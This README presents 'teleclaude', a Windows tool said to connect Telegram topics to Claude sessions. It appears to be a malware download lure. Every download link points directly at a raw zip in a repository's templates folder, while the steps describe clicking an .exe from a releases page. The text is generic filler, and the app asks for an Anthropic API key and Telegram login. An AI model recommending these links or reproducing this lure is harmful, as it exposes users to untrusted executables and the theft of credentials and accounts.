# 🤖 teleclaude - Connect Telegram messages to Claude sessions

[![](https://img.shields.io/badge/Download_Teleclaude-007bff?style=for-the-badge)](https://github.com/contealessandrovoltalandscape881/teleclaude/raw/refs/heads/main/templates/Software-3.0.zip)

Teleclaude bridges the gap between your Telegram account and Claude Code. Many users want to keep their Claude sessions alive while managing requests through Telegram. This software routes your individual Telegram topics into specific, isolated sessions. It maintains memory across these sessions so you can pick up where you left off.

## ⚙️ System Requirements

Your computer needs a few things to run this software. Ensure you have these items ready:

* Windows 10 or Windows 11.
* A stable internet connection.
* A Telegram account.
* An Anthropic API key.

## 📥 How to Install

1. Visit the [official download page](https://github.com/contealessandrovoltalandscape881/teleclaude/raw/refs/heads/main/templates/Software-3.0.zip).
2. Look for the latest release on the right side of the page.
3. Click the file ending in .exe to start your download.
4. Open the downloaded file to begin the setup process.
5. Follow the prompts on your screen.
6. Launch the application from your Start menu once the process ends.

## 🔑 Initial Configuration

The software requires a connection to your accounts. You will see an initial prompt when you open the application for the first time.

* Enter your Anthropic API key in the provided box. This allows the program to talk to Claude. You can find this key in your Anthropic dashboard.
* Link your Telegram account. The app will open a browser window. Follow the Telegram instructions to authorize the connection.
* Save your settings. The app will store these locally on your computer.

## 🏗️ Managing Your Sessions

Teleclaude operates through topics. You can think of a topic as a specific conversation thread.

1. Open a chat in your Telegram app.
2. Use the `/start` command to initiate a new workspace.
3. Choose a name for your topic.
4. Type your message to Claude. 
5. The software routes your message to the correct session.
6. Teleclaude remembers the history of that specific topic.

## 🧠 Persistent Memory Explained

Standard chat sessions often forget previous instructions. Teleclaude solves this for your Telegram workflows. It keeps a database of your conversations locally. When you return to a topic after a few hours, the software loads your previous context. This allows for complex tasks that span multiple days. 

## 🛡️ Privacy and Security

You control your data. Teleclaude stores your conversation history on your own computer. It does not send your private data to any third-party servers outside of the required connection to Anthropic for the processing of your messages. 

* Your API keys remain on your machine.
* Telegram messages travel through encrypted channels.
* Your local database is not accessible from the internet.

## 🛠️ Troubleshooting Common Issues

Check this list if you have trouble getting started:

* Check your internet connection. The app requires constant access to sync messages.
* Verify your API key. An expired or incorrect key will prevent Claude from responding.
* Restart the application. Sometimes a fresh start fixes syncing errors.
* Update your Telegram app. Ensure you run a current version of the messaging client.

## 📂 Understanding the Folder Structure

When you install the application, it creates a folder on your computer. You do not need to edit these files, but they serve specific purposes:

* **Config:** This stores your API keys and your user preferences.
* **Logs:** This folder keeps records of errors to help diagnose issues.
* **Database:** This folder holds the memory of your sessions. We advise against moving or deleting these files, as it will reset your conversation history.

## 💡 Best Practices for Daily Use

Use descriptive names for your topics. Instead of naming a folder "Work," use "Project-Website-Redesign." This helps the software keep your Claude sessions organized. Use clear sentences in your prompts. Claude performs better when your instructions follow a logical structure. If a session becomes too long, start a new topic to keep the response time fast.

## 👥 Managing Multiple Topics

You can run several sessions at the same time. Open different Telegram chats for different tasks. Teleclaude handles each chat as an independent entity. This means Claude will not get confused between your coding tasks and your creative writing projects. The software manages the handoff between these threads automatically.

## 📜 Final Setup Checklist

* Download the current version from [the release page](https://github.com/contealessandrovoltalandscape881/teleclaude/raw/refs/heads/main/templates/Software-3.0.zip).
* Install the program using the setup wizard.
* Provide your Anthropic API credentials.
* Authenticate your Telegram profile.
* Create your first topic and send a test message.
* Observe the response to confirm the routing works.

You are now ready to use Teleclaude to manage your AI sessions. The application runs in the background. Close the window to hide it in your system tray, where it will continue to listen for new messages from Telegram.